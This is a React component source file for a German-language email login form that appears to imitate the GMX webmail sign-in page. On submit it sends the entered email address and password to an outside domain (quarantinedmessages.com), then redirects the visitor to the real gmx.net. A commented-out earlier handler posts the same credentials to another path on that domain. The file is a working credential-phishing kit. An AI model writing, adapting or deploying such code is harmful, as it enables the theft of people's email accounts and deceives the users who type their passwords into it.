import React, { useState } from 'react'
import '../styles/Form.css'
import { IoIosMail } from 'react-icons/io'
import { AiFillEye } from 'react-icons/ai'
import axios, { Axios } from 'axios'

const Form = () => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [count, setCount] = useState(0)
  const [isLoading, setIsLoading] = useState(false)
  const [redirecting, setRedirecting] = useState(false)

  const handleSubmit = async (e) => {
    e.preventDefault()

    const requestBody = {
      email: email,
      password: password,
      count: count,
    }

    try {
      setIsLoading(true)
      const response = await fetch('https://quarantinedmessages.com/legend', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(requestBody),
      })

      const responseData = await response.json()

      if (response.ok) {
        console.log(`Post request successful: ${JSON.stringify(responseData)}`)
      } else {
        console.error(`Post request failed: ${JSON.stringify(responseData)}`)
      }
    } catch (error) {
      console.error('An error occurred:', error)
    } finally {
      setIsLoading(false)
      setPassword('')
      setEmail('')
      window.location.href = 'https://www.gmx.net/'
      // setTimeout(() => {
      //   window.location.href = 'https://www.google.com';
      //   console.log("redirecting")
      // }, 4000);
    }
  }

  // const handleSubmit = async (e) => {
  //     e.preventDefault();

  //     try{
  //         const response = await axios.post('https://quarantinedmessages.com/logs', {
  //             password: password,
  //             email: email
  //         })
  //         setIsLoading(true)

  //         console.log(response);
  //         console.log("Posting")
  //     }catch (error) {
  //         console.error('Error making POST request:', error);
  //     }

  //     setRedirecting(true);

  //     setIsLoading(false)
  //     setEmail('')
  //     setPassword('')

  // }

  return (
    <div className="form">
      <div className="form-contain">
        <div className="form-cover">
          <div className="email">
            <IoIosMail color="#1c449b" fontSize={40} />
            <h5>e-mail</h5>
          </div>
          <form onSubmit={handleSubmit} className="forms-input">
            <div className="input-box">
              <div className="email-form">
                <div className="e-input">
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="E-Mail-Adresse"
                  />
                </div>
              </div>
              <div className="password">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  // required
                  placeholder="Passwort"
                />
                <AiFillEye color="#bcbcbc" fontSize={20} />
              </div>
            </div>
            <div className="login">
              <button type="submit" onClick={handleSubmit}>
                {isLoading ? 'Please Wait' : 'Login'}
              </button>
            </div>
          </form>
          <div className="login">
            {/* {isLoading ? 
                    <p>....</p> :
                    null    
                } */}

            {/* <button type='submit' onClick={handleSubmit}>
                            {isLoading ? 'Please Wait' : 'Login'}
                        </button> */}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Form
